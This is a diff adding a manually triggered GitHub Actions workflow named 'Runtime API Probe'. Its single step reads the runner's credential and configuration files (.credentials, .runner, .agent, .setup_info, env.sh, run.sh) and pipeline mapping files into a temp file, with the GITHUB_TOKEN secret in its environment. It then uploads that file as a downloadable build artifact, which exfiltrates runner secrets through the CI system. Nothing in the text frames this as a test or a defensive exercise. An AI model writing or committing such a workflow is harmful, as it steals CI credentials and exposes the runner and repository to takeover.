@@ -1,0 +1,36 @@
+name: Runtime API Probe
+on:
+  workflow_dispatch:
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Probe runtime API
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set +e
+          exec 3>&1 1>/tmp/runtime_output.txt 2>&1
+          echo "=== Credential files ==="
+          for f in /home/runner/actions-runner/cached/2.335.1/.credentials /home/runner/actions-runner/cached/2.335.1/.runner /home/runner/actions-runner/cached/2.335.1/.agent; do
+            echo "--- $f ---"
+            cat "$f" 2>&1
+          done
+          echo "=== Setup info ==="
+          cat /home/runner/actions-runner/cached/2.335.1/.setup_info 2>&1
+          echo "=== _PipelineMapping ==="
+          find /home/runner/work/_PipelineMapping -type f 2>/dev/null | head -10
+          cat /home/runner/work/_PipelineMapping/* 2>&1
+          echo "=== _actions dir ==="
+          find /home/runner/work/_actions -name "*.js" -path "*/dist/*" 2>/dev/null | head -5
+          echo "=== Try to get runtime URL from runner ==="
+          # Look for runtime URL in runner config
+          cat /home/runner/actions-runner/cached/2.335.1/run.sh 2>&1
+          echo "=== Runner env.sh ==="
+          cat /home/runner/actions-runner/cached/2.335.1/env.sh 2>&1
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: runtime-results
+          path: /tmp/runtime_output.txt
